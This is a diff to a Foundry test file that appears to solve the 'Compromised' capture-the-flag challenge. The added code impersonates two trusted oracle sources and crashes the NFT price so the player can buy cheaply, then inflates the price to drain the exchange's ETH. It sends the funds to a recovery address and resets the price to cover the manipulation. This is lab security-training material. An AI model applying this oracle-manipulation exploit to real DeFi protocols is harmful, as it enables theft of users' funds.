@@ -20,7 +20,6 @@ contract CompromisedChallenge is Test {
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
     uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;
 
-
     address[] sources = [
         0x188Ea627E3531Db590e6f1D71ED83628d1933088,
         0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
@@ -75,7 +74,39 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        vm.startPrank(sources[0]);
+        oracle.postPrice(nft.symbol(), PLAYER_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+
+        vm.startPrank(sources[1]);
+        oracle.postPrice(nft.symbol(), PLAYER_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+
+        vm.prank(player);
+        uint256 id = exchange.buyOne{value: PLAYER_INITIAL_ETH_BALANCE}();
+
+        vm.startPrank(sources[0]);
+        oracle.postPrice(nft.symbol(), PLAYER_INITIAL_ETH_BALANCE + EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+
+        vm.startPrank(sources[1]);
+        oracle.postPrice(nft.symbol(), PLAYER_INITIAL_ETH_BALANCE + EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+
+        vm.startPrank(player);
+        nft.approve(address(exchange), id);
+        exchange.sellOne(id);
+        (bool success,) = recovery.call{value: EXCHANGE_INITIAL_ETH_BALANCE}("");
+        require(success, "send eth fail");
+        vm.stopPrank();
+
+        vm.startPrank(sources[0]);
+        oracle.postPrice(nft.symbol(), INITIAL_NFT_PRICE);
+        vm.stopPrank();
+
+        vm.startPrank(sources[1]);
+        oracle.postPrice(nft.symbol(), INITIAL_NFT_PRICE);
+        vm.stopPrank();
     }
 
     /**
